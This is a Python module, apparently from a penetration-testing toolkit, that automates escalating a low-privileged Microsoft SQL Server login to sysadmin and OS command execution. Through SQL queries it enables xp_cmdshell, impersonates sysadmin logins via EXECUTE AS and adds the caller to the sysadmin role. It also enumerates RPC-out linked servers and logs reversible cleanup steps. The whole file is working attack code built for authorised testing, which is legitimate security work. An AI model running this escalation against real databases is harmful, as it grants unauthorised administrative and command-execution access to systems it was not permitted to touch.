"""MSSQL privilege escalation — a low-privileged SQL login to sysadmin.

`spray mssql` gives you a login; being *sysadmin* is what unlocks xp_cmdshell (see
:mod:`fieldkit.transport`). This module drives the SQL-layer escalation from a non-sysadmin
login to sysadmin, via the two standard paths:

  * **EXECUTE AS impersonation** — the login holds ``IMPERSONATE`` on a sysadmin login
    (commonly ``sa``); assume it and add your own login to the ``sysadmin`` role. This is
    auto-proven here (reversible: ``sp_dropsrvrolemember``), which genuinely upgrades your
    access so the normal ``enum``/``escalate`` xp_cmdshell chain then works;
  * **linked servers** — a link configured for RPC-out/data-access can run commands on the
    remote instance, often privileged. These are *enumerated and surfaced* (an operator
    drives the host-specific hop); auto-exploitation would need the remote in scope.

Queries prefix each result value with a ``FK:`` sentinel, so parsing is robust regardless
of how the driven tool formats its result table. The child-process runner is injected as
everywhere else, so this is testable with a fake ``nxc``.
"""
import re
from dataclasses import dataclass, field

from .creds import Credential

# ---- queries (FK: sentinel makes the result trivially parseable) -------------
_IS_SYSADMIN = "SELECT 'FK:'+CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar(1))"
_WHOAMI = "SELECT 'FK:'+SUSER_NAME()"
_IMPERSONATE = ("SELECT 'FK:'+b.name FROM sys.server_permissions a "
                "JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id "
                "WHERE a.permission_name='IMPERSONATE'")
_LINKED = "SELECT 'FK:'+name FROM sys.servers WHERE is_linked=1 AND is_rpc_out_enabled=1"
# xp_cmdshell capability — being sysadmin is ONE way to run it, but a login granted
# EXECUTE (or one where it's already enabled) can too. Enable (best-effort) then test.
_XP_ENABLE = ("EXEC sp_configure 'show advanced options',1;RECONFIGURE;"
              "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE")
_XP_TEST = "EXEC master..xp_cmdshell 'echo FK:XPOK'"
_XP_DISABLE = "EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE"


def _as_login(login, inner):
    return f"EXECUTE AS LOGIN='{login}';{inner};REVERT"


def _query_argv(cred, ip, sql):
    from .creds import render_nxc
    return render_nxc(cred, "mssql", target=ip, extra=["-q", sql])


def _fk(output):
    """Every ``FK:<value>`` the driven query relayed, stripped."""
    return [m.strip() for m in re.findall(r"FK:(.*)", output or "")]


@dataclass
class MssqlReport:
    host: str
    status: str = "none"     # xpcmd|escalated|already_sysadmin|gated|linked_only|none|failed|aborted
    via: str = None               # the impersonated login, when escalated via impersonation
    impersonatable: list = field(default_factory=list)   # sysadmin logins we can impersonate
    linked: list = field(default_factory=list)           # linked servers (rpc-out)
    aborted: str = None


def escalate_privs(store, host, cred, *, run=None, allow_config_change=False, on_event=None):
    """Get from an MSSQL login to OS command execution.

    Read-only (no ``allow_config_change``) just enumerates the surface — sysadmin?,
    impersonatable sysadmin logins, RPC-out linked servers. With ``allow_config_change`` it
    **tries xp_cmdshell directly first** (enable + run — this works whether you're sysadmin
    or merely granted xp_cmdshell rights) and only falls back to EXECUTE AS impersonation if
    that fails. On success it records a proven finding + captured step, upgrades your MSSQL
    access to admin (so ``enum``/``escalate`` run over xp_cmdshell), and records reversible
    cleanup (disable xp_cmdshell, drop the role member)."""
    from . import runner as runner_mod
    run = run or (lambda argv, env=None: runner_mod.run(argv, env_add=env))
    cred = cred if isinstance(cred, Credential) else Credential.from_row(cred)
    ip = host["ip"]
    rep = MssqlReport(host=ip)

    def query(sql):
        rendered = _query_argv(cred, ip, sql)
        return run(rendered.argv, rendered.env)

    def emit(m):
        if on_event:
            on_event(m)

    def xp_works():
        """Best-effort enable xp_cmdshell, then confirm it runs. Returns (ok, output)."""
        query(_XP_ENABLE)
        out = query(_XP_TEST).output or ""
        return "XPOK" in out, out

    # read-only enumeration first (always safe)
    res = query(_IS_SYSADMIN)
    if res.error:
        rep.aborted = res.error
        return rep
    is_sa = "1" in _fk(res.output)
    me = next(iter(_fk(query(_WHOAMI).output)), None) or cred.username
    for login in _fk(query(_IMPERSONATE).output):
        if "1" in _fk(query(_as_login(login, _IS_SYSADMIN)).output):
            rep.impersonatable.append(login)
            emit(f"  impersonatable sysadmin login: {login}")
    rep.linked = _fk(query(_LINKED).output)
    for s in rep.linked:
        emit(f"  linked server (rpc-out): {s}")

    if not allow_config_change:
        rep.status = ("already_sysadmin" if is_sa else
                      "gated" if rep.impersonatable else
                      "linked_only" if rep.linked else "none")
        _record_linked(store, host, rep)
        return rep

    # 1) xp_cmdshell directly — you don't need to be sysadmin, just able to run it.
    emit("  testing xp_cmdshell (enable + echo)…")
    ok, out = xp_works()
    if ok:
        rep.status = "xpcmd"
        _establish_exec(
            store, host, cred, ip, proof=out,
            report_type="mssql_xpcmdshell",
            title=f"MSSQL xp_cmdshell → OS command execution ({'sysadmin' if is_sa else me})",
            evidence=f"{me} can enable and run xp_cmdshell (verified `echo FK:XPOK`) — OS "
                     "command execution as the SQL Server service account.",
            cleanups=[(f"enabled xp_cmdshell on {ip}",
                       f'nxc mssql {ip} … -q "{_XP_DISABLE}"')])
        _record_linked(store, host, rep)
        return rep

    # 2) can't run it directly → impersonate a sysadmin, grant self sysadmin, retry.
    if rep.impersonatable:
        login = rep.impersonatable[0]
        emit(f"  escalating: EXECUTE AS {login} → add {me} to sysadmin, then xp_cmdshell")
        query(_as_login(login, f"EXEC sp_addsrvrolemember '{me}','sysadmin'"))
        ok, out = xp_works()
        if ok:
            rep.status = "escalated"
            rep.via = login
            drop = _as_login(login, f"EXEC sp_dropsrvrolemember '{me}','sysadmin'")
            _establish_exec(
                store, host, cred, ip, proof=out,
                report_type="mssql_impersonation",
                title=f"MSSQL EXECUTE AS impersonation ({login}) → sysadmin → xp_cmdshell",
                evidence=f"{me} holds IMPERSONATE on sysadmin login {login}; added {me} to "
                         "the sysadmin role and enabled xp_cmdshell (verified).",
                cleanups=[(f"added {me} to the MSSQL sysadmin role on {ip}",
                           f'nxc mssql {ip} … -q "{drop}"'),
                          (f"enabled xp_cmdshell on {ip}",
                           f'nxc mssql {ip} … -q "{_XP_DISABLE}"')])
            _record_linked(store, host, rep)
            return rep
        rep.status = "failed"
        return rep

    rep.status = "linked_only" if rep.linked else "none"
    _record_linked(store, host, rep)
    return rep


def _establish_exec(store, host, cred, ip, *, proof, report_type, title, evidence, cleanups):
    """Record the proven OS-exec finding, upgrade the MSSQL access to admin (so enum/escalate
    run over xp_cmdshell), and record the reversible cleanup(s)."""
    with store.transaction():
        fid, _ = store.add_finding(report_type, title, host_id=host["id"],
                                   proven=True, evidence=evidence)
        store.add_step(cmd=f'nxc mssql {ip} … -q "{_XP_TEST}"',
                       output=(proof or "FK:XPOK").strip(), host_id=host["id"],
                       finding_id=fid, transport="mssql")
        store.add_access(host["id"], store.credential_id(cred), "mssql", admin=True)
        for desc, cmd in cleanups:
            store.add_artifact(desc, cleanup_cmd=cmd, host_id=host["id"], finding_id=fid)


def _record_linked(store, host, rep):
    """Linked servers are observations — enumerated, not exploited."""
    if not rep.linked:
        return
    with store.transaction():
        store.add_finding(
            "mssql_linked_server",
            f"MSSQL linked server(s) with RPC-out: {', '.join(rep.linked)}",
            host_id=host["id"],
            evidence="rpc-out linked servers reachable from this instance: "
                     + ", ".join(rep.linked)
                     + ". `EXEC ('…') AT [<server>]` runs on the remote instance.")


